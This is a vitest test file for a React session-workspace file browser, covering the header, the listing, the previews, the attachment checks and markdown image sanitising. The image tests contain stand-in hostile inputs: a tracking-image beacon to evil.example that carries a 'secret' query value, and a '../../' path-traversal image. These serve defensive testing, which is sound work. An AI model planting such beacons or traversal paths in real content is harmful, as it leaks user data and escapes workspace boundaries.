import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "@abstractframework/panel-chat";
import {
  FilePreview,
  PREVIEW_TEXT_LIMIT,
  attachOutcomeNotice,
  attachPrecheck,
  parseListing,
  partialPreviewNote,
  readBoundedText,
  safeMarkdownImages,
  WorkspaceFileList,
  WorkspaceHeader,
  canOpenFolder,
  formatBytes,
  previewKind,
  workspaceContentUrl,
  workspaceFilesUrl,
  type RunWorkspace,
} from "./session_files";

const noop = () => {};
const info = (patch: Partial<RunWorkspace> = {}): RunWorkspace => ({
  workspace_root: "/Users/me/.abstractgateway/workspaces/session-abc",
  kind: "session",
  session_id: "abc",
  exists: true,
  host: { hostname: "studio.local", caller_is_this_machine: true },
  open_supported: true,
  ...patch,
});
const header = (value: RunWorkspace) =>
  renderToStaticMarkup(<WorkspaceHeader info={value} onCopy={noop} onOpen={noop} />);

describe("session workspace header", () => {
  it("shows the absolute path with a copy button", () => {
    const html = header(info());
    expect(html).toContain("/Users/me/.abstractgateway/workspaces/session-abc");
    expect(html).toContain('aria-label="Copy workspace path"');
  });

  it("offers Open folder only to a browser on the gateway machine that can open folders", () => {
    expect(canOpenFolder(info())).toBe(true);
    expect(header(info())).toContain("Open folder");
    expect(header(info())).not.toContain("on the gateway host");

    const remote = info({ host: { hostname: "studio.local", caller_is_this_machine: false } });
    expect(canOpenFolder(remote)).toBe(false);
    expect(header(remote)).not.toContain("Open folder");
    expect(header(remote)).toContain("on the gateway host studio.local");

    const headless = info({ open_supported: false });
    expect(canOpenFolder(headless)).toBe(false);
    expect(header(headless)).not.toContain("Open folder");

    // A gateway that does not say where the caller is: treated as remote.
    const unknown = info({ host: undefined });
    expect(canOpenFolder(unknown)).toBe(false);
    expect(header(unknown)).toContain("on the gateway host");
  });

  it("says when the folder does not exist yet", () => {
    expect(header(info({ exists: false }))).toContain("does not exist yet");
  });
});

describe("session workspace listing", () => {
  it("lists folders first with sizes, and states a truncated listing explicitly", () => {
    const html = renderToStaticMarkup(
      <WorkspaceFileList
        listing={{
          path: "",
          truncated: true,
          entries: [
            { name: "notes.md", path: "notes.md", type: "file", size_bytes: 2048, mtime: "2026-09-25T10:00:00Z" },
            { name: "src", path: "src", type: "dir" },
          ],
        }}
        onOpenDir={noop}
        onSelectFile={noop}
      />,
    );
    expect(html.indexOf("src/")).toBeLessThan(html.indexOf("notes.md"));
    expect(html).toContain("2.0 KiB");
    expect(html).toContain("listed only part of this folder (2 entries shown)");
  });

  it("does not claim truncation when the gateway says the list is complete", () => {
    const html = renderToStaticMarkup(
      <WorkspaceFileList
        listing={{ path: "", truncated: false, entries: [] }}
        onOpenDir={noop}
        onSelectFile={noop}
      />,
    );
    expect(html).not.toContain("listed only part");
    expect(html).toContain("This folder is empty.");
  });

  it("addresses the run-scoped routes", () => {
    expect(workspaceFilesUrl("r/1", "src/app")).toBe(
      "/api/gateway/runs/r%2F1/workspace/files?path=src%2Fapp&recursive=false",
    );
    expect(workspaceContentUrl("r1", "a b.md")).toBe(
      "/api/gateway/runs/r1/workspace/content?path=a+b.md",
    );
  });
});

describe("file preview", () => {
  it("chooses the preview from the name, then the gateway's content type", () => {
    expect(previewKind("README.md")).toBe("markdown");
    expect(previewKind("data.json")).toBe("json");
    expect(previewKind("events.jsonl")).toBe("text");
    expect(previewKind("plot.PNG")).toBe("image");
    expect(previewKind("index.html")).toBe("html");
    expect(previewKind("main.py")).toBe("text");
    expect(previewKind("Dockerfile")).toBe("text");
    expect(previewKind("archive.zip")).toBe("binary");
    expect(previewKind("model.bin", "application/octet-stream")).toBe("binary");
    expect(previewKind("noext", "text/plain; charset=utf-8")).toBe("text");
    expect(previewKind("noext", "image/webp")).toBe("image");
    expect(previewKind("payload", "application/json")).toBe("json");
  });

  const entry = { name: "page.html", path: "out/page.html", type: "file" as const, size_bytes: 10 };
  const render = (state: any, e = entry) =>
    renderToStaticMarkup(
      <FilePreview entry={e} url="/api/gateway/x" state={state} onAttach={noop} attaching={false} />,
    );

  it("shows HTML as source, never rendered", () => {
    const html = render({ status: "ready", kind: "html", text: "<b>hi</b>", partial: false });
    expect(html).toContain("&lt;b&gt;hi&lt;/b&gt;");
    expect(html).toContain("<pre");
  });

  it("renders images from the content URL and offers binaries as a download", () => {
    expect(render({ status: "ready", kind: "image", partial: false })).toContain('<img class="code-file-preview-image" src="/api/gateway/x"');
    const binary = render({ status: "ready", kind: "binary", partial: false });
    expect(binary).toContain("No preview for this file type");
    expect(binary).toContain('download="page.html"');
  });

  it("keeps the attach-to-conversation action and says when a preview is partial", () => {
    const html = render(
      { status: "ready", kind: "text", text: "x", partial: true, total: 3 * 1024 * 1024 },
      { ...entry, size_bytes: 3 * 1024 * 1024 },
    );
    expect(html).toContain("Attach to conversation");
    expect(html).toContain("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
  });

  it("surfaces a gateway error instead of an empty preview", () => {
    expect(render({ status: "error", message: "Preview failed (404): no route" })).toContain(
      "Preview failed (404): no route",
    );
  });
});

describe("listing validation", () => {
  it("keeps the gateway's truncated flag", () => {
    const listing = parseListing({ path: "", entries: [{ name: "a", path: "a", type: "file" }], truncated: true }, "");
    expect(listing.truncated).toBe(true);
    const html = renderToStaticMarkup(<WorkspaceFileList listing={listing} onOpenDir={noop} onSelectFile={noop} />);
    expect(html).toContain("listed only part of this folder (1 entries shown)");
    expect(parseListing({ entries: [], truncated: false }, "sub").path).toBe("sub");
  });

  it("treats a malformed or older response as an error, not an empty folder", () => {
    expect(() => parseListing({ items: [] }, "")).toThrow(/Unexpected \/workspace\/files response.*entries/);
    expect(() => parseListing({ entries: [] }, "")).toThrow(/truncated/);
    expect(() => parseListing({ entries: [{ name: "x" }], truncated: false }, "")).toThrow(/entry 1/);
    expect(() => parseListing(null, "")).toThrow(/not an object/);
  });
});

describe("bounded text preview", () => {
  const body = (bytes: number) => new Uint8Array(bytes).fill(97);

  it("reads only the first 1 MiB of a large file even when the server ignores Range", async () => {
    const total = 3 * 1024 * 1024;
    const response = new Response(body(total), { status: 200, headers: { "content-length": String(total) } });
    const read = await readBoundedText(response, PREVIEW_TEXT_LIMIT);
    expect(read.received).toBe(PREVIEW_TEXT_LIMIT);
    expect(read.text.length).toBe(PREVIEW_TEXT_LIMIT);
    expect(read).toMatchObject({ partial: true, total });
    expect(partialPreviewNote(read.total)).toBe("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
  });

  it("takes the size from Content-Range when the listing gives none", async () => {
    const response = new Response(body(1024), { status: 206, headers: { "content-range": "bytes 0-1023/5000" } });
    const read = await readBoundedText(response, 1024);
    expect(read).toMatchObject({ received: 1024, total: 5000, partial: true });
  });

  it("is complete when the whole file fits", async () => {
    const response = new Response("hello", { status: 206, headers: { "content-range": "bytes 0-4/5" } });
    expect(await readBoundedText(response, PREVIEW_TEXT_LIMIT)).toMatchObject({ text: "hello", partial: false, total: 5 });
  });

  it("says the size is unknown rather than guessing", () => {
    expect(partialPreviewNote(undefined)).toContain("a file of unknown size");
  });
});

describe("attach from the workspace", () => {
  const big = { name: "dump.bin", path: "dump.bin", type: "file" as const, size_bytes: 5 * 1024 * 1024 };

  it("applies the gateway's size limit before downloading", () => {
    expect(attachPrecheck(big, 1024 * 1024)).toBe("dump.bin is 5 MB; the gateway accepts files up to 1 MB.");
    expect(attachPrecheck(big, undefined)).toBeNull();
    expect(attachPrecheck({ ...big, size_bytes: 10 }, 1024)).toBeNull();
  });

  it("never claims success for a refused file and names the reason", () => {
    const refused = { id: "1", name: "a", size: 9, status: "refused" as const, file: new File(["x"], "a"), message: "a is 9 B; the gateway accepts files up to 1 B." };
    expect(attachOutcomeNotice("a", refused)).toBe("Not attached: a is 9 B; the gateway accepts files up to 1 B.");
    expect(attachOutcomeNotice("a", { ...refused, status: "queued", message: undefined })).not.toContain("added");
    expect(attachOutcomeNotice("a", undefined)).toContain("not queued");
  });
});

describe("markdown preview images", () => {
  it("renders workspace images and turns remote ones into links", () => {
    const md = [
      "![plot](figs/plot.png)",
      "![beacon](https://evil.example/t.gif?d=secret)",
      "Inline ![pix](//evil.example/p.png) text",
      "![up](../../escape.png)",
      "```",
      "![code](https://example.com/in-code.png)",
      "```",
    ].join("\n");
    const safe = safeMarkdownImages(md, "r1", "docs/README.md");
    expect(safe).toContain("![plot](/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png)");
    expect(safe).toContain("[image: beacon](https://evil.example/t.gif?d=secret)");
    expect(safe).toContain("[image: pix](//evil.example/p.png)");
    expect(safe).toContain("[image: up](../../escape.png)");
    expect(safe).toContain("![code](https://example.com/in-code.png)");
    const html = renderToStaticMarkup(<Markdown text={safe.split("```")[0]} />);
    expect(html).toContain('src="/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png"');
    expect(html).not.toMatch(/<img[^>]+src="(https?:)?\/\/evil/);
  });
});
